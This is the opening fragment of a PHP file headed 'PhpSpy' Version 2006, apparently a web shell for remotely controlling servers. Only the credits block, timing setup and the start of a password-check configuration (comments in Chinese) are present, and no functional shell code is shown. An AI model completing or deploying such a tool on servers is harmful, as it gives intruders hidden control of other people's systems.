<?php
/*
+--------------------------------------------------------------------------+
| str_replace(".", "", "P.h.p.S.p.y") Version:2006                         |
| Codz by Angel                                                            |
| (c) 2004 Security Angel Team                                             |
| http://www.4ngel.net                                                     |
| ======================================================================== |
| Team:  http://www.4ngel.net                                              |
|        http://www.bugkidz.org                                            |
| Email: 4ngel@21cn.com                                                    |
| Date:  Mar 21st 2005                                                     |
| Thx All The Fantasy of Wickedness's members                              |
| Thx FireFox (http://www.molyx.com)                                       |
+--------------------------------------------------------------------------+
*/

error_reporting(7);
ob_start();
$mtime = explode(' ', microtime());
$starttime = $mtime[1] + $mtime[0];

/*===================== 程序配置 =====================*/

// 是否需要密码验证,1为需要验证,其他数字为直接进入.下面选项则无效
$admin['check'] = "1";

// 如果需要密码验证,请修改登陆密码
